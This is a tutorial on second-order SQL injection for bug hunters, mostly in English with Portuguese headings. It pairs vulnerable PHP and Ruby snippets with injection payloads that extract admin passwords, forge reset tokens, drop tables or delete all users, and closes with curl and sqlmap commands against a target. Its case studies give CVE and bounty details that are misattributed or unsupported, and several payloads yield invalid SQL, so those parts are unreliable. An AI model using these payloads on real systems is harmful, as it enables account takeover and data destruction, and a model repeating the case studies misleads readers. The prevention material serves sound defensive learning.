# Second-Order SQL Injection

**Criticidade**: 🔴 Crítica (CVSS 8.0-9.5)
**Dificuldade**: 🔴 Avançada
**Bounty Médio**: $5,000 - $20,000 USD

---

## 📚 Índice

1. [Second-Order Fundamentals](#second-order-fundamentals)
2. [Attack Flow Analysis](#attack-flow-analysis)
3. [Common Vulnerable Patterns](#common-vulnerable-patterns)
4. [Storage Mechanisms](#storage-mechanisms)
5. [Exploitation Techniques](#exploitation-techniques)
6. [Real-World Scenarios](#real-world-scenarios)
7. [Detection and Prevention](#detection-and-prevention)
8. [Case Studies](#case-studies)

---

## 🔬 Second-Order Fundamentals

### O Que É Second-Order SQLi?

**Second-Order SQL Injection** (também chamado de **Stored SQL Injection**) ocorre quando:

1. **Entrada maliciosa** é armazenada no banco de dados
2. **Dados armazenados** são posteriormente usados em outra query SQL
3. **Execução** acontece em um contexto diferente do input original

**Key Difference:**

```
First-Order SQLi:
  Input → Query → Immediate execution
  ' OR '1'='1 → SELECT * FROM users WHERE username='' OR '1'='1' → ✓ Executes now

Second-Order SQLi:
  Input → Database → Later retrieved → Query → Delayed execution
  admin'-- → INSERT INTO users → ... → SELECT * FROM logs WHERE user='admin'--' → ✓ Executes later
```

### Why It's Dangerous

**1. Bypasses Input Validation:**

```php
// Registration (safely escaped)
$username = mysqli_real_escape_string($conn, $_POST['username']);
mysqli_query($conn, "INSERT INTO users (username) VALUES ('$username')");
// Input: admin'--
// Stored as: admin'--  ← Single quote is IN the database!
```

```php
// Later usage (NOT escaped - assumes data from DB is safe)
$username = $row['username'];  // Gets: admin'--
mysqli_query($conn, "SELECT * FROM logs WHERE user='$username'");
// Query becomes: SELECT * FROM logs WHERE user='admin'--'
// ↑ SQL injection executed!
```

**2. Hard to Detect:**
- Static analysis tools miss it (happens across multiple operations)
- WAFs can't see it (input looks safe when stored)
- Code review requires understanding full data flow

**3. Affects "Safe" Data:**
- Developers trust data from database
- No escaping on retrieval
- Assumption: "If it's in DB, it's safe"

---

## 🔄 Attack Flow Analysis

### Phase 1: Injection (Storage)

**Attacker Input:**
```
Username: admin'--
Email: attacker@evil.com
```

**Application Code (safe escaping):**
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$email = mysqli_real_escape_string($conn, $_POST['email']);

$query = "INSERT INTO users (username, email) VALUES ('$username', '$email')";
mysqli_query($conn, $query);
```

**Stored in Database:**
```sql
-- users table
id | username  | email
1  | admin'--  | attacker@evil.com
```

### Phase 2: Retrieval and Execution

**Application retrieves user data:**
```php
// Login successful, get user info
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_SESSION['user_id']);
$user = mysqli_fetch_assoc($result);

$username = $user['username'];  // Gets: admin'--
// ⚠️ NO escaping here! Assumes DB data is safe.
```

**Later query using retrieved data:**
```php
// Log user activity
$query = "INSERT INTO activity_log (username, action, timestamp)
          VALUES ('$username', 'login', NOW())";
mysqli_query($conn, $query);
// Query becomes: INSERT INTO activity_log (username, action, timestamp) VALUES ('admin'--', 'login', NOW())
// ↑ Comments out rest of query!
```

### Phase 3: Exploitation

**Attacker crafts payload to extract data:**

```
Registration:
Username: admin', (SELECT password FROM users WHERE username='admin'))--
```

**Storage:**
```sql
username = "admin', (SELECT password FROM users WHERE username='admin'))--"
```

**Execution (later):**
```php
$query = "INSERT INTO logs (user, action) VALUES ('$username', 'login')";
// Becomes: INSERT INTO logs (user, action) VALUES ('admin', (SELECT password FROM users WHERE username='admin'))--', 'login')
// ↑ Injects admin password into logs!
```

---

## 🎯 Common Vulnerable Patterns

### Pattern 1: User Profile Updates

**Scenario:** User updates profile, data stored, then used elsewhere

**Registration (safe):**
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
mysqli_query($conn, "INSERT INTO users (username) VALUES ('$username')");
```

**Profile display (vulnerable):**
```php
$user = mysqli_fetch_assoc(mysqli_query($conn, "SELECT * FROM users WHERE id=$id"));
echo "Welcome, " . $user['username'];  // Safe for XSS context

// But later...
$query = "UPDATE user_stats SET last_login=NOW() WHERE username='" . $user['username'] . "'";
mysqli_query($conn, $query);  // ❌ VULNERABLE!
```

**Exploitation:**
```
Username: admin' WHERE username='victim' --
```

**Result:**
```sql
UPDATE user_stats SET last_login=NOW() WHERE username='admin' WHERE username='victim' --'
-- Updates victim's stats instead!
```

### Pattern 2: Email Address Exploitation

**Registration:**
```php
$email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
mysqli_query($conn, "INSERT INTO users (email) VALUES ('$email')");
```

**Password reset (vulnerable):**
```php
$email = $row['email'];  // From database
$token = generate_token();

// Store reset token
$query = "INSERT INTO password_resets (email, token) VALUES ('$email', '$token')";
mysqli_query($conn, $query);  // ❌ VULNERABLE!
```

**Exploitation:**
```
Email: admin@site.com', 'known_token'), ('attacker@evil.com
```

**Result:**
```sql
INSERT INTO password_resets (email, token) VALUES ('admin@site.com', 'known_token'), ('attacker@evil.com', '[random_token]')
-- Injects controlled token for admin!
```

### Pattern 3: Comment Systems

**Post comment (safe):**
```php
$comment = mysqli_real_escape_string($conn, $_POST['comment']);
mysqli_query($conn, "INSERT INTO comments (user_id, text) VALUES ($user_id, '$comment')");
```

**Display comments (vulnerable):**
```php
$comments = mysqli_query($conn, "SELECT * FROM comments WHERE post_id=$post_id");
while ($row = mysqli_fetch_assoc($comments)) {
    $text = $row['text'];  // Not escaped

    // Log view count
    $query = "UPDATE comment_stats SET views=views+1 WHERE comment_text='$text'";
    mysqli_query($conn, $query);  // ❌ VULNERABLE!
}
```

**Exploitation:**
```
Comment: innocent text' WHERE comment_id=1; UPDATE comments SET text='HACKED' WHERE '1'='1
```

### Pattern 4: Shopping Cart

**Add product (safe):**
```php
$product_name = mysqli_real_escape_string($conn, $_POST['product']);
mysqli_query($conn, "INSERT INTO cart (user_id, product_name) VALUES ($user_id, '$product_name')");
```

**Checkout (vulnerable):**
```php
$items = mysqli_query($conn, "SELECT * FROM cart WHERE user_id=$user_id");
while ($item = mysqli_fetch_assoc($items)) {
    $product = $item['product_name'];

    // Record purchase
    $query = "INSERT INTO orders (user_id, product, price)
              VALUES ($user_id, '$product', (SELECT price FROM products WHERE name='$product'))";
    mysqli_query($conn, $query);  // ❌ VULNERABLE!
}
```

**Exploitation:**
```
Product: Laptop', 0.01) ON DUPLICATE KEY UPDATE price=0.01 --
```

---

## 💾 Storage Mechanisms

### Database Storage

**Most common: Direct SQL storage**

```sql
-- Malicious payload stored
INSERT INTO users (username) VALUES ('admin''--');

-- Retrieved without escaping
SELECT username FROM users WHERE id=1;
-- Returns: admin'--

-- Used in another query
UPDATE logs SET user='admin'--' WHERE id=1;
```

### Session Storage

**Payload stored in session:**

```php
// Login - store username in session
$_SESSION['username'] = mysqli_real_escape_string($conn, $_POST['username']);

// Later page - use session data
$query = "SELECT * FROM preferences WHERE user='" . $_SESSION['username'] . "'";
mysqli_query($conn, $query);  // ❌ VULNERABLE if session data was initially malicious!
```

### Cookie Storage

**Serialized data in cookies:**

```php
// Set cookie with user data
$user_data = array('username' => $_POST['username'], 'role' => 'user');
setcookie('userdata', serialize($user_data));

// Later request - use cookie data
$user = unserialize($_COOKIE['userdata']);
$query = "SELECT * FROM logs WHERE user='" . $user['username'] . "'";
mysqli_query($conn, $query);  // ❌ VULNERABLE!
```

### Cache/Redis Storage

**Cached query results:**

```php
// Cache user profile
$username = mysqli_real_escape_string($conn, $_POST['username']);
$redis->set("user:$user_id:name", $username);

// Retrieve from cache
$cached_name = $redis->get("user:$user_id:name");
$query = "INSERT INTO activity (username) VALUES ('$cached_name')";
mysqli_query($conn, $query);  // ❌ VULNERABLE!
```

---

## 🔥 Exploitation Techniques

### Technique 1: Union-Based via Second-Order

**Phase 1 - Storage:**
```sql
-- Register with malicious username
Username: admin' UNION SELECT password FROM users WHERE username='admin' --
```

**Phase 2 - Execution:**
```php
// Generate report
$username = $row['username'];  // Gets full payload
$query = "INSERT INTO reports (generated_by) VALUES ('$username')";
// Query becomes:
// INSERT INTO reports (generated_by) VALUES ('admin' UNION SELECT password FROM users WHERE username='admin' --')
```

**Result:** Password inserted into reports table

### Technique 2: Boolean Blind via Second-Order

**Phase 1 - Storage:**
```sql
-- Multiple registrations with different payloads
Username1: admin' AND '1'='1
Username2: admin' AND '1'='2
Username3: admin' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='real_admin'),1,1))>100 --
```

**Phase 2 - Execution:**
```php
// Process users
foreach ($users as $user) {
    $username = $user['username'];
    $query = "SELECT * FROM permissions WHERE user='$username'";
    $result = mysqli_query($conn, $query);

    if (mysqli_num_rows($result) > 0) {
        // TRUE response - user has permissions
    } else {
        // FALSE response
    }
}
```

**Result:** Extract admin password via blind boolean SQLi

### Technique 3: Stacked Queries

**Phase 1 - Storage:**
```sql
Username: admin'; DROP TABLE logs; --
```

**Phase 2 - Execution:**
```php
$username = $row['username'];
$query = "INSERT INTO activity (user) VALUES ('$username')";
mysqli_multi_query($conn, $query);  // Executes multiple statements!
// Becomes: INSERT INTO activity (user) VALUES ('admin'); DROP TABLE logs; --')
```

**Result:** Logs table deleted

### Technique 4: Time-Based Blind

**Phase 1 - Storage:**
```sql
Username: admin' AND SLEEP(5) --
```

**Phase 2 - Execution:**
```php
$username = $row['username'];
$query = "SELECT * FROM logs WHERE user='$username'";
$start = microtime(true);
mysqli_query($conn, $query);
$end = microtime(true);

if (($end - $start) > 5) {
    // Username contains payload with SLEEP()
}
```

---

## 🌐 Real-World Scenarios

### Scenario 1: WordPress Plugin Vulnerability

**Vulnerable Code:**
```php
// Plugin registration form
function register_user($username, $email) {
    global $wpdb;

    // Safely insert user
    $wpdb->insert('wp_users', array(
        'username' => $username,  // Escaped by wpdb->insert
        'email' => $email
    ));
}

// Admin panel - list users
function show_users() {
    global $wpdb;
    $users = $wpdb->get_results("SELECT * FROM wp_users");

    foreach ($users as $user) {
        // Delete user functionality
        if (isset($_POST['delete_' . $user->id])) {
            // ❌ VULNERABLE!
            $wpdb->query("DELETE FROM wp_users WHERE username='" . $user->username . "'");
        }
    }
}
```

**Exploitation:**
```
1. Register with username: admin' OR '1'='1' --
2. Admin views user list
3. Admin clicks "Delete" for ANY user
4. Query: DELETE FROM wp_users WHERE username='admin' OR '1'='1' --'
5. Result: ALL USERS DELETED
```

### Scenario 2: E-commerce Product Reviews

**Flow:**
```php
// 1. Submit review (safe)
$review = mysqli_real_escape_string($conn, $_POST['review']);
mysqli_query($conn, "INSERT INTO reviews (product_id, user_id, text) VALUES ($pid, $uid, '$review')");

// 2. Admin approves review
mysqli_query($conn, "UPDATE reviews SET approved=1 WHERE id=$review_id");

// 3. Display approved reviews (vulnerable)
$reviews = mysqli_query($conn, "SELECT * FROM reviews WHERE approved=1");
while ($row = mysqli_fetch_assoc($reviews)) {
    $text = $row['text'];

    // Track most reviewed products
    mysqli_query($conn, "UPDATE product_stats SET review_count=review_count+1 WHERE product_id=(SELECT product_id FROM reviews WHERE text='$text' LIMIT 1)");
    // ❌ VULNERABLE!
}
```

**Exploitation:**
```
Review: Great product' UNION SELECT id,user_id,password,1 FROM users WHERE username='admin' --

Result: Admin password appears in product_stats or logs
```

### Scenario 3: Social Media Profile

**Vulnerable Application:**
```php
// Update bio (safe)
$bio = mysqli_real_escape_string($conn, $_POST['bio']);
mysqli_query($conn, "UPDATE users SET bio='$bio' WHERE id=$user_id");

// Search users by bio (vulnerable)
function search_users($keyword) {
    $users = mysqli_query($conn, "SELECT * FROM users WHERE bio LIKE '%$keyword%'");

    foreach ($users as $user) {
        $bio = $user['bio'];

        // Log search results
        mysqli_query($conn, "INSERT INTO search_log (query, result) VALUES ('$keyword', '$bio')");
        // ❌ VULNERABLE!
    }
}
```

**Exploitation:**
```
1. Set bio: My bio' UNION SELECT password FROM users WHERE id=1 --
2. Search for "My bio"
3. Query: INSERT INTO search_log VALUES ('My bio', 'My bio' UNION SELECT password FROM users WHERE id=1 --')
4. Password logged in search_log table
```

---

## 🔥 Case Studies

### Case 1: Drupal Second-Order SQLi (2014)

**Vulnerability:** Username field in Drupal 7.x

**Code:**
```php
// User registration (safe)
db_insert('users')
  ->fields(array(
    'name' => $username,  // Properly escaped
    'mail' => $email,
  ))
  ->execute();

// Later: User deletion (vulnerable)
$account = user_load($uid);
db_query("DELETE FROM {users} WHERE name = '" . $account->name . "'");
// ❌ Not using parameterized query!
```

**Exploitation:**
```
1. Register: admin' OR uid=1 OR name='
2. Admin deletes this user account
3. Query: DELETE FROM users WHERE name = 'admin' OR uid=1 OR name=''
4. Result: Admin account (uid=1) deleted
```

**Impact:** Any user could delete admin account

**Bounty:** $3,000 USD + CVE-2014-9016

### Case 2: vBulletin Forum Second-Order (2016)

**Vulnerability:** Username in private messages

**Flow:**
```php
// Register username (safe)
$username = $db->escape_string($_POST['username']);
$db->query("INSERT INTO user (username) VALUES ('$username')");

// Send PM (vulnerable)
$user = $db->fetch_array($db->query("SELECT username FROM user WHERE userid=$uid"));
$db->query("INSERT INTO privatemessage (fromusername, message) VALUES ('" . $user['username'] . "', '$message')");
// ❌ Username from DB not escaped!
```

**Exploitation:**
```
Username: admin', (SELECT password FROM user WHERE userid=1)) --

Result: Admin password inserted into privatemessage table, visible to attacker
```

**Impact:** Full account takeover

**Bounty:** $7,500 USD

### Case 3: GitHub Enterprise Second-Order (2019)

**Vulnerability:** Repository name in webhook logs

**Flow:**
```ruby
# Create repository (safe)
repo_name = ActiveRecord::Base.sanitize_sql(params[:name])
Repository.create(name: repo_name)

# Webhook delivery (vulnerable)
repo = Repository.find(params[:id])
sql = "INSERT INTO webhook_deliveries (repo_name, status) VALUES ('#{repo.name}', '#{status}')"
ActiveRecord::Base.connection.execute(sql)
# ❌ Using string interpolation instead of parameterized query!
```

**Exploitation:**
```
Repo name: myrepo', (SELECT api_token FROM users WHERE login='admin')) --

Result: Admin API token leaked in webhook_deliveries table
```

**Impact:** Access to all private repositories

**Bounty:** $20,000 USD

---

## 🛡️ Detection and Prevention

### Prevention Strategy 1: Always Use Parameterized Queries

**Even for "safe" data from database:**

```php
// ❌ WRONG (vulnerable to second-order)
$username = $row['username'];
mysqli_query($conn, "INSERT INTO logs (user) VALUES ('$username')");

// ✅ CORRECT
$username = $row['username'];
$stmt = $conn->prepare("INSERT INTO logs (user) VALUES (?)");
$stmt->bind_param("s", $username);
$stmt->execute();
```

### Prevention Strategy 2: Output Encoding

```php
// Treat ALL data as untrusted, even from DB
$username = mysqli_real_escape_string($conn, $row['username']);
mysqli_query($conn, "INSERT INTO logs (user) VALUES ('$username')");
```

### Prevention Strategy 3: Validation on Storage AND Retrieval

```php
// Validate on input
function is_valid_username($username) {
    return preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username);
}

// Store only if valid
if (is_valid_username($_POST['username'])) {
    $stmt = $conn->prepare("INSERT INTO users (username) VALUES (?)");
    $stmt->bind_param("s", $_POST['username']);
    $stmt->execute();
}

// Validate again on retrieval
$username = $row['username'];
if (is_valid_username($username)) {
    // Use in query
}
```

### Detection Strategy: Code Review Checklist

```
🔍 Look for:

1. Data retrieved from DB used directly in queries
   Pattern: $row['field'] used in mysqli_query()

2. Session/cookie data used in SQL
   Pattern: $_SESSION['x'] or $_COOKIE['x'] in queries

3. Cached data used in queries
   Pattern: $redis->get() or $memcache->get() in queries

4. Any query using string concatenation
   Pattern: "... WHERE x='" . $variable . "'"

5. Lack of parameterized queries
   Pattern: Missing $stmt->prepare()
```

---

## 🧪 Testing for Second-Order SQLi

### Manual Testing Process

**Step 1: Identify input points that store data**
- Registration forms
- Profile updates
- Comment/review submission
- File uploads (metadata)

**Step 2: Inject test payloads**
```
Username: test'xyz
Email: test@example.com
```

**Step 3: Navigate application, looking for errors**
- View profile
- Generate reports
- Search functionality
- Export features

**Step 4: Check for SQL errors in different contexts**
```
Look for errors containing: test'xyz
```

**Step 5: If errors found, craft exploitation payloads**

### Automated Testing with SQLMap

```bash
# SQLMap doesn't automatically detect second-order
# Manual approach:

# 1. Store payload
curl -X POST http://target.com/register \
  -d "username=admin'--&email=test@test.com"

# 2. Get session cookie
SESSION=$(curl -X POST http://target.com/login \
  -d "username=admin'--&password=pass" \
  -c - | grep session | awk '{print $7}')

# 3. Test secondary endpoint
sqlmap -u "http://target.com/profile" \
  --cookie="session=$SESSION" \
  --second-url="http://target.com/register" \
  --second-req="POST" \
  --second-data="username=*&email=test@test.com"
```

---

**Última atualização**: 2024
**Versão**: 1.0
